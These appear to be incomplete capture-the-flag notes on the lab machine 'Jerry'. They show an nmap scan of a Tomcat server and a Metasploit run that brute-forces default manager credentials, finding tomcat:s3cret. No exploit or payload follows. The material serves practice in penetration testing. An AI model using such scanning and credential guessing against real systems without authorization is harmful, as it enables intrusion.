# Jerry 10.10.10.95 - Windows

 - __User__:
 - __Root__:

## Initial Attempt, 05/05/2020


```shell
Nmap scan report for 10.10.10.95
Host is up (0.031s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

 - Browser to 8080 shows default Apache Tomcat page, 7.0.88
 - Nmap says http not https
 - `http://10.10.10.95:8080/docs/RELEASE-NOTES.txt` has a list of potential search strings

A metasploit scanner landed on some weak credentials for the default install:

```shell
msf5 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
.
snip
.
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
.
snip
.
[-] 10.10.10.95:8080 - LOGIN FAILED: both:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
```

Manger web panel provided info:

 - JVM `1.8.0_171-b11`
 - Windows Server 2012 R2 6.3
 - amd64
 - There appears to be a `/host-manager/html` as well as the `/manager/html` we accessed... our creds don't work there.

Retrying credential scan on new url `/host-manager/html`, says that tomcat/s3cret still works but we get 403's.